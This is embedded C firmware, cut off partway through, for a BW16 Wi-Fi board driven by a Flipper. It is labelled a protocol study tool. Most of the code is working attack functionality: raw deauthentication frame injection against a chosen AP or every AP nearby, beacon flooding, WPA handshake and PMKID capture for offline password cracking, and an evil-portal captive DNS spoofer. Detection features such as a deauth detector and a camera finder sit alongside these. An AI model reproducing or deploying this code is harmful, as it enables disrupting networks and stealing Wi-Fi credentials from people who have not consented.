/*
 * BW16 (RTL8720DN) WiFi Protocol Study Firmware  v3
 * Realtek AmebaD Arduino SDK 3.1.9
 *
 * Features: dual-band scan, EAPOL/SAE capture, PMKID,
 *           deauth injection, evil portal, PMF detection.
 *
 * LED mapping (BW16 hardware vs SDK names):
 *   PIN D10 = BLUE  (SDK: LED_G / AMB_D10)
 *   PIN D11 = GREEN (SDK: LED_B / AMB_D11)
 *   PIN D12 = RED   (SDK: LED_R / AMB_D12)
 *   All active-LOW.
 */

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiServer.h>
#include <WiFiUdp.h>
extern "C" {
  #include "wifi_conf.h"
  #include "wifi_constants.h"
  #include "wifi_structures.h"
  #include "wifi_ind.h"
}
#include "lwip/netif.h"   /* netif type (already pulled in by WiFiServer) */
extern "C" {
  void LwIP_UseStaticIP(struct netif *pnetif);
  void dhcps_init(struct netif *pnetif);
  void dhcps_deinit(void);
}
extern struct netif xnetif[];
#include "frame_parser.h"
#include "protocol.h"

/* Raw management frame injection (Realtek AmebaD wext API) */
extern "C" int wext_send_mgnt(const char *ifname, char *buf,
                               unsigned short buf_len, unsigned short flags);

/* ── LED ─────────────────────────────────────────────────────── */
#define PIN_R  LED_R   /* D12  RED   */
#define PIN_G  LED_B   /* D11  GREEN (SDK calls it LED_B) */
#define PIN_B  LED_G   /* D10  BLUE  (SDK calls it LED_G) */

static void led(bool r, bool g, bool b) {
    digitalWrite(PIN_R, r ? LOW : HIGH);
    digitalWrite(PIN_G, g ? LOW : HIGH);
    digitalWrite(PIN_B, b ? LOW : HIGH);
}

/* ── UART emit to Flipper ────────────────────────────────────── *
 * Sent on BOTH Serial (LOG_UART) and Serial1 so it works no matter
 * which BW16 TX pin is wired to the Flipper. A leading '\n' flushes
 * any partial Realtek debug-log line so our message lands clean.   */
static char _sb[PROTO_MAX_LEN];
#define emit(fmt, ...) do { \
    snprintf(_sb, sizeof(_sb), fmt, ##__VA_ARGS__); \
    Serial.print('\n');  Serial.print(_sb);  Serial.print('\n');  \
    Serial1.print('\n'); Serial1.print(_sb); Serial1.print('\n'); \
} while(0)

/* ── Timing ──────────────────────────────────────────────────── */
#define HEARTBEAT_MS              3000
#define SCAN_PERIOD_MS            1500   /* gap between scans (near-continuous) */
#define SCAN_TIMEOUT_MS           6000
#define DWELL_MS                    60   /* per-channel chanmap dwell */
#define CAPTURE_DEAUTH_INTERVAL  2000    /* ms between deauth bursts */

/* ── 5 GHz channel table ─────────────────────────────────────── */
static const uint8_t CH5[] = {
    36, 40, 44, 48, 52, 56, 60, 64,
    100,104,108,112,116,120,124,128,132,136,140,
    149,153,157,161,165
};
#define N_CH5 24

/* ── Mode FSM ────────────────────────────────────────────────── */
typedef enum { MODE_IDLE, MODE_MONITOR, MODE_SCAN, MODE_CHANMAP,
               MODE_CAPTURE, MODE_PORTAL, MODE_DEAUTH, MODE_BEACON,
               MODE_DEAUTHALL, MODE_PWN, MODE_PROBE, MODE_CAMHUNT,
               MODE_DEAUTHDET, MODE_STATIONS } AppMode;

/* Known WiFi camera / surveillance / IoT-cam vendor OUI prefixes.
 * Heuristic: flags devices whose MAC vendor is a common camera maker. */
typedef struct { uint8_t oui[3]; const char* name; } CamOui;
static const CamOui CAM_OUIS[] = {
    /* Hikvision */
    {{0x44,0x19,0xB6},"Hikvision"}, {{0x4C,0xBD,0x8F},"Hikvision"},
    {{0x28,0x57,0xBE},"Hikvision"}, {{0xC0,0x56,0xE3},"Hikvision"},
    {{0xBC,0xAD,0x28},"Hikvision"}, {{0x54,0xC4,0x15},"Hikvision"},
    /* Dahua / Amcrest / Lorex */
    {{0x3C,0xEF,0x8C},"Dahua"},     {{0x90,0x02,0xA9},"Dahua"},
    {{0xE0,0x50,0x8B},"Dahua"},     {{0x9C,0x8E,0xCD},"Amcrest"},
    {{0x08,0xED,0xED},"Lorex"},
    /* Wyze */
    {{0x2C,0xAA,0x8E},"Wyze"},      {{0x7C,0x78,0xB2},"Wyze"},
    {{0xD0,0x3F,0x27},"Wyze"},
    /* Tuya / generic smart-cam */
    {{0x68,0x57,0x2D},"Tuya cam"},  {{0xEC,0xFA,0xBC},"Tuya cam"},
    {{0x10,0x5A,0x17},"Tuya cam"},  {{0xD8,0x1F,0x12},"Tuya cam"},
    /* Nest / Google */
    {{0x18,0xB4,0x30},"Nest cam"},  {{0x64,0x16,0x66},"Nest cam"},
    {{0x1C,0xF2,0x9A},"Nest cam"},
    /* Ring / Amazon */
    {{0xFC,0xA1,0x83},"Ring"},      {{0x00,0x62,0x6E},"Ring"},
    {{0x44,0x65,0x0D},"Ring"},      {{0x74,0xC2,0x46},"Ring"},
    /* Arlo / Netgear */
    {{0x9C,0xD3,0x6D},"Arlo"},      {{0x40,0x5D,0x82},"Arlo"},
    /* Axis / Ubiquiti / D-Link / Foscam pro cams */
    {{0xAC,0xCC,0x8E},"Axis"},      {{0x00,0x40,0x8C},"Axis"},
    {{0xB4,0xFB,0xE4},"Ubiquiti"},  {{0x78,0x8A,0x20},"UniFi cam"},
    {{0xFC,0xEC,0xDA},"UniFi cam"}, {{0x1C,0x7E,0xE5},"D-Link cam"},
    {{0xB0,0xC5,0x54},"D-Link cam"},{{0x00,0x62,0x6E},"Foscam"},
    /* TP-Link / Tapo */
    {{0x50,0xC7,0xBF},"Tapo cam"},  {{0xAC,0x84,0xC6},"Tapo cam"},
    {{0x30,0xB5,0xC2},"Tapo cam"},
    /* Xiaomi / Yi / Aqara cams */
    {{0x04,0xCF,0x8C},"Xiaomi cam"},{{0x78,0x11,0xDC},"Xiaomi cam"},
    {{0x54,0xEF,0x44},"Aqara cam"},
    /* Reolink */
    {{0xEC,0x3D,0xFD},"Reolink"},
    /* DIY / ESP32-cam (very common in spy-cams) */
    {{0x24,0x0A,0xC4},"ESP32-cam"}, {{0x30,0xAE,0xA4},"ESP32-cam"},
    {{0x7C,0x9E,0xBD},"ESP32-cam"}, {{0xB4,0xE6,0x2D},"ESP cam"},
    {{0x2C,0x3A,0xE8},"ESP cam"},   {{0x3C,0x71,0xBF},"ESP cam"},
    {{0xA0,0x20,0xA6},"ESP cam"},
};
#define CAM_OUI_N (int)(sizeof(CAM_OUIS)/sizeof(CAM_OUIS[0]))

static const char* cam_match(const uint8_t* mac) {
    for(int i=0;i<CAM_OUI_N;i++)
        if(mac[0]==CAM_OUIS[i].oui[0] && mac[1]==CAM_OUIS[i].oui[1]
           && mac[2]==CAM_OUIS[i].oui[2]) return CAM_OUIS[i].name;
    return NULL;
}
/* small seen-list to avoid spamming the same camera */
static uint8_t g_cam_seen[24][6];
static int     g_cam_seen_n = 0;
static bool cam_is_new(const uint8_t* mac) {
    for(int i=0;i<g_cam_seen_n;i++) if(memcmp(g_cam_seen[i],mac,6)==0) return false;
    if(g_cam_seen_n<24){ memcpy(g_cam_seen[g_cam_seen_n++],mac,6); }
    return true;
}

/* Deauth-All: BW16 sniffs every AP (beacons) while channel-hopping and
 * deauths each one it has seen on the matching channel. Self-contained. */
#define DALL_MAX 48
static uint8_t g_dall_bssid[DALL_MAX][6];
static uint8_t g_dall_ch[DALL_MAX];
static int     g_dall_count = 0;
static bool    g_pwn_smart = false;  /* smart mode: passive sniff, no deauth */
static void dall_add(const uint8_t* bssid, uint8_t ch) {
    if(ch < 1 || ch > 13) return;
    for(int i=0;i<g_dall_count;i++)
        if(memcmp(g_dall_bssid[i],bssid,6)==0) return;
    if(g_dall_count < DALL_MAX) {
        memcpy(g_dall_bssid[g_dall_count],bssid,6);
        g_dall_ch[g_dall_count]=ch;
        g_dall_count++;
    }
}

/* Sustained deauth target */
static uint8_t  g_deauth_bssid[6] = {0};
static uint8_t  g_deauth_ch       = 6;
static uint32_t g_deauth_sent     = 0;

/* Beacon flood */
static char     g_beacon_ssids[12][33];
static int      g_beacon_count = 0;
static uint8_t  g_bcn_base[6]  = {0xDE,0xAD,0xBE,0xEF,0x00,0x00};
static const char* const RICK_SSIDS[] = {
    "Never gonna give you up","Never gonna let you down",
    "Never gonna run around","and desert you",
    "Never gonna make you cry","Never gonna say goodbye",
    "Never gonna tell a lie","and hurt you"
};

/* Captive-portal HTML streamed from the Flipper (base64).
 * Portal is deprecated ("coming soon"); keep this small to save RAM. */
static char     g_html[4096];
static uint16_t g_html_len   = 0;
static bool     g_html_ready = false;

/* decode one base64 chunk (no padding handling needed mid-stream) */
static void b64_append(const char* in) {
    static const char* T =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int val=0, bits=0;
    for(const char* p=in; *p && *p!='\r' && *p!='\n'; p++) {
        if(*p=='=') break;
        const char* p2 = strchr(T, *p);
        if(!p2) continue;
        val = (val<<6) | (int)(p2 - T);
        bits += 6;
        if(bits >= 8) {
            bits -= 8;
            if(g_html_len < sizeof(g_html)-1)
                g_html[g_html_len++] = (char)((val >> bits) & 0xFF);
        }
    }
}

static volatile AppMode g_mode = MODE_IDLE;
static uint8_t  g_mon_ch    = 6;
static uint32_t g_last_scan = 0;
static uint32_t g_last_hb   = 0;
static volatile bool g_scan_done = false;

/* ── Channel map counters ────────────────────────────────────── */
static volatile uint32_t g_cnt24[13]   = {0};
static volatile uint32_t g_cnt5[N_CH5] = {0};
static uint8_t g_cur_ch = 1;

/* ── PMF cache (bssid → PMF_* from beacons) ──────────────────── */
#define PMF_CACHE_SZ 32
static struct { uint8_t mac[6]; uint8_t pmf; } g_pmf[PMF_CACHE_SZ];
static uint8_t g_pmf_cnt = 0;

static void pmf_set(const uint8_t* m, uint8_t p) {
    for(uint8_t i = 0; i < g_pmf_cnt; i++)
        if(memcmp(g_pmf[i].mac, m, 6)==0) { g_pmf[i].pmf=p; return; }
    if(g_pmf_cnt < PMF_CACHE_SZ) {
        memcpy(g_pmf[g_pmf_cnt].mac, m, 6);
        g_pmf[g_pmf_cnt++].pmf = p;
    }
}
static uint8_t pmf_get(const uint8_t* m) {
    for(uint8_t i = 0; i < g_pmf_cnt; i++)
        if(memcmp(g_pmf[i].mac, m, 6)==0) return g_pmf[i].pmf;
    return PMF_NONE;
}

/* ── Capture state ───────────────────────────────────────────── */
static uint8_t  g_cap_bssid[6]    = {0};
static uint8_t  g_cap_ch          = 0;
static uint8_t  g_cap_stage       = 0;
static uint32_t g_cap_last_deauth = 0;

/* ── Portal ──────────────────────────────────────────────────── */
static WiFiServer g_srv(80);
static WiFiUDP    g_dns;
static bool       g_portal = false;
static bool       g_dns_up = false;
static bool       g_client_announced = false;
static volatile bool g_sta_assoc = false;   /* set when a device joins the AP */

/* fires (on the wifi thread) when a station associates to our soft-AP */
static void ap_assoc_cb(char* buf, int buf_len, int flags, void* ud) {
    (void)buf; (void)buf_len; (void)flags; (void)ud;
    g_sta_assoc = true;
}

/* Captive-portal DNS: answer EVERY query with the AP's IP (192.168.1.1)
 * so the phone's connectivity check resolves to us and pops the login. */
static void handle_dns() {
    if(!g_dns_up) return;
    int sz = g_dns.parsePacket();
    if(sz < 12) return;
    static uint8_t b[512];
    int n = g_dns.read(b, sizeof(b));
    if(n < 12 || n > 480) return;

    /* a DNS query means the client got a DHCP IP and is doing the
     * captive-detection lookup — distinct from L2 association */
    if(!g_client_announced) { g_client_announced = true; emit("O,4,dns"); }

    b[2] |= 0x80;          /* QR = response */
    b[3] = (b[3] & 0x70) | 0x80; /* RA */
    b[6]=0x00; b[7]=0x01;  /* ANCOUNT = 1 */
    b[8]=0; b[9]=0; b[10]=0; b[11]=0; /* NS/AR counts = 0 */
    int o = n;
    b[o++]=0xC0; b[o++]=0x0C;       /* name -> offset 12 */
    b[o++]=0x00; b[o++]=0x01;       /* type A */
    b[o++]=0x00; b[o++]=0x01;       /* class IN */
    b[o++]=0; b[o++]=0; b[o++]=0; b[o++]=30; /* TTL 30 */
    b[o++]=0x00; b[o++]=0x04;       /* RDLENGTH 4 */
    b[o++]=192; b[o++]=168; b[o++]=1; b[o++]=1;  /* AP IP */
    g_dns.beginPacket(g_dns.remoteIP(), g_dns.remotePort());
    g_dns.write(b, o);
    g_dns.endPacket();
}

/* ── Forward declarations ────────────────────────────────────── */
static void promisc_cb(unsigned char*, unsigned int, void*);
static void start_portal(const char*, const char*, uint8_t);

/* ── Security code helper ────────────────────────────────────── */
static uint8_t sec_code(rtw_security_t s) {
    if(s == RTW_SECURITY_OPEN)            return SEC_OPEN;
    if(s & WEP_ENABLED)                   return SEC_WEP;
    if(s == RTW_SECURITY_WPA3_AES_PSK)    return SEC_WPA3;
    if(s == RTW_SECURITY_WPA2_WPA3_MIXED) return SEC_MIX;
    if(s & WPA2_SECURITY)                 return SEC_WPA2;
    if(s & WPA_SECURITY)                  return SEC_WPA;
    return SEC_WPA2;
}

/* ── Scan callback ───────────────────────────────────────────── */
static rtw_result_t scan_cb(rtw_scan_handler_result_t* res) {
    if(res->scan_complete) { g_scan_done = true; return RTW_SUCCESS; }
    rtw_scan_result_t* ap = &res->ap_details;
    char ssid[33] = {0};
    uint8_t l = ap->SSID.len < 32 ? ap->SSID.len : 32;
    memcpy(ssid, ap->SSID.val, l);
    for(char* p = ssid; *p; p++) if(*p==',') *p='_';
    if(!ssid[0]) strncpy(ssid, "[hidden]", 9);
    char bssid[18]; mac_to_str(ap->BSSID.octet, bssid);
    uint8_t sec = sec_code(ap->security);
    /* PMF inferred from security: WPA3 mandates it, mixed makes it optional */
    uint8_t pmf = (sec==SEC_WPA3) ? PMF_REQUIRED
                : (sec==SEC_MIX)  ? PMF_OPTIONAL : PMF_NONE;
    emit("S,%s,%s,%d,%u,%u,%u",
         ssid, bssid,
         (int)ap->signal_strength,
         (unsigned)ap->channel,
         (unsigned)sec, (unsigned)pmf);
    return RTW_SUCCESS;
}

/* ── PMKID extraction from EAPOL msg-1 key data ─────────────── */
static void try_pmkid(const uint8_t* kd, uint16_t kd_len,
                       const uint8_t* bssid_raw) {
    for(uint16_t i = 0; i+2 < kd_len; i++) {
        if(kd[i] != 0x30) continue;
        uint8_t ie_l = kd[i+1];
        if(i+2+(uint16_t)ie_l > kd_len || ie_l < 20) continue;
        const uint8_t* ie = kd+i+2;
        uint16_t pc; memcpy(&pc, ie+6, 2);
        uint16_t off = 8 + pc*4;
        if(off+2 > ie_l) continue;
        uint16_t ac; memcpy(&ac, ie+off, 2);
        off += 2 + ac*4 + 2;
        if(off+2 > ie_l) continue;
        uint16_t nc; memcpy(&nc, ie+off, 2); off += 2;
        if(nc < 1 || off+16 > ie_l) continue;
        const uint8_t* pmk = ie+off;
        char bs[18]; mac_to_str(bssid_raw, bs);
        char hex[33];
        for(int j=0; j<16; j++) snprintf(hex+j*2, 3, "%02X", pmk[j]);
        hex[32]='\0';
        emit("P,%s,%s", bs, hex);
        return;
    }
}

/* ── Parse beacon/probe IEs for RSN/PMF ─────────────────────── */
static void parse_ies(const uint8_t* p, size_t len, const uint8_t* bssid) {
    for(size_t i = 0; i+2 < len; ) {
        uint8_t id = p[i], el = p[i+1];
        if(i+2+(size_t)el > len) break;
        if(id == 0x30 && el >= 8) {
            uint8_t pmf = PMF_NONE;
            rsn_ie_parse(p+i+2, el, &pmf);
            pmf_set(bssid, pmf);
        }
        i += 2+(size_t)el;
    }
}

/* ── Build deauth frame → returns len (26) ───────────────────── */
static int build_deauth(uint8_t* buf, const uint8_t* bssid,
                         const uint8_t* dst, uint16_t reason) {
    memset(buf, 0, 26);
    buf[0]=0xC0; buf[1]=0x00;           /* FC: deauth */
    buf[2]=0x3A; buf[3]=0x01;           /* Duration */
    memcpy(buf+4,  dst,   6);           /* DA */
    memcpy(buf+10, bssid, 6);           /* SA */
    memcpy(buf+16, bssid, 6);           /* BSSID */
    buf[24]=(uint8_t)(reason&0xFF);
    buf[25]=(uint8_t)(reason>>8);
    return 26;
}

/* ── One tight burst of deauth frames ────────────────────────── *
 * Raw TX on the RTL8720DN only radiates while the radio is in
 * promiscuous mode on a fixed channel, so the caller MUST have
 * enabled promisc and set the channel before calling this.
 * Sends both AP->broadcast and (spoofed) client->AP directions.  */
static void deauth_burst(const uint8_t* bssid, int n) {
    static const uint8_t bc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t frame[26];
    for(int i=0; i<n; i++) {
        /* AP -> broadcast (kick every client) */
        build_deauth(frame, bssid, bc, 7);
        wext_send_mgnt("wlan0", (char*)frame, 26, 0);
        /* broadcast-as-AP -> BSSID (disassoc the other way) */
        build_deauth(frame, bc, bssid, 7);
        memcpy(frame+10, bssid, 6);
        wext_send_mgnt("wlan0", (char*)frame, 26, 0);
        g_deauth_sent += 2;
    }
}

/* ── Build a beacon frame for SSID at index idx ──────────────── */
static int build_beacon(uint8_t* p, const char* ssid, uint8_t ch, uint8_t idx) {
    int n = 0;
    p[n++]=0x80; p[n++]=0x00;              /* FC: beacon */
    p[n++]=0x00; p[n++]=0x00;              /* duration  */
    for(int i=0;i<6;i++) p[n++]=0xFF;      /* DA broadcast */
    uint8_t bssid[6]; memcpy(bssid,g_bcn_base,6); bssid[5]=idx;
    for(int i=0;i<6;i++) p[n++]=bssid[i];  /* SA */
    for(int i=0;i<6;i++) p[n++]=bssid[i];  /* BSSID */
    p[n++]=0x00; p[n++]=0x00;              /* seq */
    for(int i=0;i<8;i++) p[n++]=0x00;      /* timestamp */
    p[n++]=0x64; p[n++]=0x00;              /* beacon interval */
    p[n++]=0x01; p[n++]=0x04;              /* cap info: ESS */
    int sl=strlen(ssid); if(sl>32) sl=32;  /* SSID IE */
    p[n++]=0x00; p[n++]=(uint8_t)sl;
    memcpy(p+n, ssid, sl); n+=sl;
    p[n++]=0x01; p[n++]=0x08;              /* supported rates */
    p[n++]=0x82;p[n++]=0x84;p[n++]=0x8b;p[n++]=0x96;
    p[n++]=0x24;p[n++]=0x30;p[n++]=0x48;p[n++]=0x6c;
    p[n++]=0x03; p[n++]=0x01; p[n++]=ch;   /* DS param (channel) */
    return n;
}

/* ── Forward a raw 802.11 frame to the Flipper as hex (for PCAP) ─ */
static void emit_frame(const uint8_t* f, unsigned int len) {
    static char hb[460];
    static const char* H="0123456789ABCDEF";
    int p=0; hb[p++]='K'; hb[p++]=',';
    for(unsigned int i=0;i<len && p<456;i++){ hb[p++]=H[f[i]>>4]; hb[p++]=H[f[i]&0xF]; }
    hb[p]='\0';
    Serial.print('\n');  Serial.print(hb);  Serial.print('\n');
    Serial1.print('\n'); Serial1.print(hb); Serial1.print('\n');
}

/* ── Promiscuous callback ────────────────────────────────────── */
static void promisc_cb(unsigned char* buf, unsigned int len, void* ud) {
    (void)ud;
    if(len < sizeof(dot11_hdr_t)) return;
    const dot11_hdr_t* hdr = (const dot11_hdr_t*)buf;
    uint8_t ft = hdr->fc.type, fs = hdr->fc.subtype;

    /* ─ Channel map ─ */
    if(g_mode == MODE_CHANMAP) {
        if(g_cur_ch >= 1 && g_cur_ch <= 13)
            g_cnt24[g_cur_ch-1]++;
        else for(uint8_t i=0; i<N_CH5; i++)
            if(g_cur_ch == CH5[i]) { g_cnt5[i]++; break; }
        return;
    }

    /* ─ Capture mode ─ */
    if(g_mode == MODE_CAPTURE) {
        if(ft != TYPE_DATA) return;
        uint8_t qos   = (fs & 0x08) != 0;
        uint8_t addr4 = (hdr->fc.to_ds && hdr->fc.from_ds) ? 1 : 0;
        size_t mhl = sizeof(dot11_hdr_t) + addr4*6 + qos*2;
        if(len < mhl+8+sizeof(eapol_key_t)) return;
        const uint8_t* pl = buf+mhl;
        if(pl[0]!=0xAA||pl[1]!=0xAA||pl[2]!=0x03) return;
        if(pl[6]!=0x88||pl[7]!=0x8E) return;
        const eapol_key_t* ek = (const eapol_key_t*)(pl+8);
        int msg = eapol_msg_num(ek);
        if(msg < 1 || msg > 4) return;
        const uint8_t* ap_m = (msg==1||msg==3) ? hdr->addr2 : hdr->addr1;
        if(memcmp(ap_m, g_cap_bssid, 6)!=0) return;
        if(msg > (int)g_cap_stage) {
            g_cap_stage = (uint8_t)msg;
            char b[18], c[18];
            mac_to_str(ap_m, b);
            mac_to_str((msg==1||msg==3)?hdr->addr1:hdr->addr2, c);
            emit("H,%d,%s,%s", msg, b, c);
            emit_frame(buf, len);   /* forward raw frame for PCAP on Flipper SD */
            if(msg==1) {
                uint16_t kl; memcpy(&kl, &ek->data_len, 2);
                kl = (uint16_t)((kl>>8)|(kl<<8));
                const uint8_t* kd = (const uint8_t*)ek+sizeof(eapol_key_t);
                size_t mx = len-(mhl+8+sizeof(eapol_key_t));
                if(kl>0 && kl<=mx) try_pmkid(kd, kl, ap_m);
            }
        }
        return;
    }

    /* ─ Deauth-All: learn every AP from its beacon ─ */
    if(g_mode == MODE_DEAUTHALL) {
        if(ft==TYPE_MGMT && (fs==SUBTYPE_BEACON || fs==SUBTYPE_PROBE_RESP))
            dall_add(hdr->addr3, g_cur_ch);
        return;
    }

    /* ─ Pwnagotchi: learn APs AND grab any handshake on the air ─ */
    if(g_mode == MODE_PWN) {
        if(ft==TYPE_MGMT && (fs==SUBTYPE_BEACON || fs==SUBTYPE_PROBE_RESP)) {
            dall_add(hdr->addr3, g_cur_ch);
            return;
        }
        if(ft==TYPE_DATA) {
            uint8_t qos   = (fs & 0x08) != 0;
            uint8_t addr4 = (hdr->fc.to_ds && hdr->fc.from_ds) ? 1 : 0;
            size_t mhl = sizeof(dot11_hdr_t) + addr4*6 + qos*2;
            if(len < mhl+8+sizeof(eapol_key_t)) return;
            const uint8_t* pl = buf+mhl;
            if(pl[0]!=0xAA||pl[1]!=0xAA||pl[2]!=0x03) return;
            if(pl[6]!=0x88||pl[7]!=0x8E) return;
            const eapol_key_t* ek = (const eapol_key_t*)(pl+8);
            int msg = eapol_msg_num(ek);
            if(msg < 1 || msg > 4) return;
            const uint8_t* ap_m = (msg==1||msg==3) ? hdr->addr2 : hdr->addr1;
            char b[18]; mac_to_str(ap_m, b);
            emit_frame(buf, len);     /* raw frame -> PCAP */
            /* msg 2/3 carry the MIC: a usable handshake */
            if(msg==2 || msg==3) emit("G,%s", b);
            return;
        }
        return;
    }

    /* ─ Deauth detector: report any deauth/disassoc on the air ─ */
    if(g_mode == MODE_DEAUTHDET) {
        if(ft==TYPE_MGMT && (fs==SUBTYPE_DEAUTH || fs==SUBTYPE_DISASSOC)) {
            char b[18], c[18];
            mac_to_str(hdr->addr3, b); mac_to_str(hdr->addr2, c);
            emit("D,%u,%s,%s", fs==SUBTYPE_DEAUTH?0:1, b, c);
        }
        return;
    }

    /* ─ Station list: which devices are talking to which AP ─ */
    if(g_mode == MODE_STATIONS) {
        if(ft != TYPE_DATA) return;
        const uint8_t *sta, *ap;
        if(hdr->fc.to_ds && !hdr->fc.from_ds)      { sta=hdr->addr2; ap=hdr->addr1; }
        else if(!hdr->fc.to_ds && hdr->fc.from_ds) { sta=hdr->addr1; ap=hdr->addr2; }
        else return;
        if(sta[0]&0x01) return;                 /* skip multicast */
        if(cam_is_new(sta)) {                    /* reuse seen-list to dedup */
            char s[18], a[18]; mac_to_str(sta,s); mac_to_str(ap,a);
            emit("T,%s,%s", s, a);
        }
        return;
    }

    /* ─ Camera hunter: flag MACs whose vendor is a known camera maker ─ */
    if(g_mode == MODE_CAMHUNT) {
        /* check both transmitter (addr2) and receiver (addr1) */
        const uint8_t* macs[2] = { hdr->addr2, hdr->addr1 };
        for(int k=0;k<2;k++) {
            const uint8_t* m = macs[k];
            if(m[0]&0x01) continue;             /* skip broadcast/multicast */
            const char* v = cam_match(m);
            if(v && cam_is_new(m)) {
                char ms[18]; mac_to_str(m, ms);
                emit("M,%s,%s,%u", ms, v, (unsigned)g_cur_ch);
            }
        }
        return;
    }

    /* ─ Probe-request sniffer: who's looking for which network ─ */
    if(g_mode == MODE_PROBE) {
        if(ft != TYPE_MGMT || fs != 4) return;   /* 4 = probe request */
        const uint8_t* ie = buf + sizeof(dot11_hdr_t);
        if(ie + 2 > buf + len) return;
        if(ie[0] != 0) return;                   /* first IE must be SSID */
        uint8_t sl = ie[1];
        if(sl == 0 || sl > 32) return;           /* skip broadcast probes */
        if(ie + 2 + sl > buf + len) return;
        char ssid[33]; memcpy(ssid, ie+2, sl); ssid[sl]='\0';
        for(char* p=ssid; *p; p++) if(*p==',') *p='_';
        char mac[18]; mac_to_str(hdr->addr2, mac);
        emit("Q,%s,%s", mac, ssid);
        return;
    }

    if(g_mode != MODE_MONITOR) return;

    /* ─ Management ─ */
    if(ft == TYPE_MGMT) {
        char b[18], c[18];

        /* Beacon/probe-resp: grab PMF from RSN IE */
        if((fs==SUBTYPE_BEACON || fs==SUBTYPE_PROBE_RESP) &&
            len > sizeof(dot11_hdr_t)+12) {
            size_t fp = (fs==SUBTYPE_BEACON) ? 12 : 0;
            parse_ies(buf+sizeof(dot11_hdr_t)+fp,
                      len-sizeof(dot11_hdr_t)-fp, hdr->addr3);
            return;
        }

        if(fs==SUBTYPE_DEAUTH || fs==SUBTYPE_DISASSOC) {
            mac_to_str(hdr->addr3, b); mac_to_str(hdr->addr2, c);
            emit("D,%u,%s,%s", fs==SUBTYPE_DEAUTH?0:1, b, c);
        }

        if(fs==SUBTYPE_AUTH && len > sizeof(dot11_hdr_t)) {
            const auth_fixed_t* af =
                (const auth_fixed_t*)(buf+sizeof(dot11_hdr_t));
            if(af->auth_alg == AUTH_ALG_SAE) {
                mac_to_str(hdr->addr3, b); mac_to_str(hdr->addr2, c);
                emit("A,%u,%s,%s", af->auth_seq==1?1:2, b, c);
            }
        }
        return;
    }

    /* ─ Data: EAPOL ─ */
    if(ft == TYPE_DATA) {
        uint8_t qos   = (fs & 0x08) != 0;
        uint8_t addr4 = (hdr->fc.to_ds && hdr->fc.from_ds) ? 1 : 0;
        size_t mhl = sizeof(dot11_hdr_t) + addr4*6 + qos*2;
        if(len < mhl+8+sizeof(eapol_key_t)+4) return;
        const uint8_t* pl = buf+mhl;
        if(pl[0]!=0xAA||pl[1]!=0xAA||pl[2]!=0x03) return;
        if(pl[6]!=0x88||pl[7]!=0x8E) return;
        const eapol_key_t* ek = (const eapol_key_t*)(pl+8);
        int msg = eapol_msg_num(ek);
        if(msg < 1 || msg > 4) return;
        char b[18], cc[18];
        const uint8_t *ap_m, *sta_m;
        if(msg==1||msg==3) { ap_m=hdr->addr2; sta_m=hdr->addr1; }
        else               { ap_m=hdr->addr1; sta_m=hdr->addr2; }
        mac_to_str(ap_m, b); mac_to_str(sta_m, cc);
        emit("H,%d,%s,%s", msg, b, cc);
        if(msg==1) {
            uint16_t kl; memcpy(&kl, &ek->data_len, 2);
            kl = (uint16_t)((kl>>8)|(kl<<8));
            const uint8_t* kd = (const uint8_t*)ek+sizeof(eapol_key_t);
            size_t mx = len-(mhl+8+sizeof(eapol_key_t))-4;
            if(kl>0 && kl<=mx) try_pmkid(kd, kl, ap_m);
        }
    }
}

/* Channel map is now built on the Flipper from scan results (AP-per-channel),
 * so no promiscuous frame-counting sweep is needed here. */

/* ── CMD parser (Flipper → BW16) ──────────────────────────────── */
static char cmd_buf[PROTO_MAX_LEN];
static uint8_t cmd_pos = 0;

static void handle_cmd(const char* line) {
    if(strncmp(line, "CMD,", 4) != 0) return;
    const char* c = line+4;

    if(strncmp(c, "SCAN", 4)==0) {
        if(g_mode != MODE_IDLE) {
            wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
            g_mode = MODE_IDLE;
        }
        g_last_scan = 0;  /* trigger immediate scan next loop */
    }
    else if(strncmp(c, "STOP", 4)==0) {
        if(g_portal) {
            /* clean low-level teardown so a later portal re-launch works */
            g_dns.stop(); g_dns_up=false;
            dhcps_deinit();
            g_portal=false;
            wifi_off(); delay(60);
            wifi_on(RTW_MODE_STA); delay(60);  /* restore STA for scanning */
        }
        wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
        g_mode = MODE_IDLE;
        led(0,1,0);
        g_last_scan = 0;  /* resume scanning */
    }
    else if(strncmp(c, "MONITOR", 7)==0) {
        /* CMD,MONITOR[,ch] – passive promiscuous protocol analysis */
        uint8_t ch = 6;
        const char* comma = strchr(c, ',');
        if(comma) { int v = atoi(comma+1); if(v>=1 && v<=165) ch=(uint8_t)v; }
        g_mon_ch = ch;
        wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_cb, 1);
        wifi_set_channel(g_mon_ch);
        g_mode = MODE_MONITOR;
        led(0,0,1);
    }
    else if(strncmp(c, "DEAUTH,", 7)==0) {
        char tmp[PROTO_MAX_LEN];
        strncpy(tmp, c+7, PROTO_MAX_LEN-1); tmp[PROTO_MAX_LEN-1]='\0';
        char* bs = strtok(tmp,",");
        char* chs= strtok(NULL,",");
        if(!bs||!chs) return;
        if(!str_to_mac(bs, g_deauth_bssid)) return;
        g_deauth_ch   = (uint8_t)atoi(chs);
        g_deauth_sent = 0;
        /* Promisc ON is required for raw TX to actually radiate */
        wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_cb, 1);
        wifi_set_channel(g_deauth_ch);
        delay(10);
        g_mode = MODE_DEAUTH;
        char bs2[18]; mac_to_str(g_deauth_bssid, bs2);
        emit("W,%s,0", bs2);
    }
    else if(strncmp(c, "CAPTURE,", 8)==0) {
        char tmp[PROTO_MAX_LEN];
        strncpy(tmp, c+8, PROTO_MAX_LEN-1); tmp[PROTO_MAX_LEN-1]='\0';
        char* bs = strtok(tmp,",");
        char* chs= strtok(NULL,",");
        if(!bs||!chs) return;
        if(!str_to_mac(bs, g_cap_bssid)) return;
        g_cap_ch=    (uint8_t)atoi(chs);
        g_cap_stage= 0;
        g_cap_last_deauth = 0;
        g_mode = MODE_CAPTURE;
        wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
        delay(50);
        wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_cb, 1);
        wifi_set_channel(g_cap_ch);
        led(0,0,1);
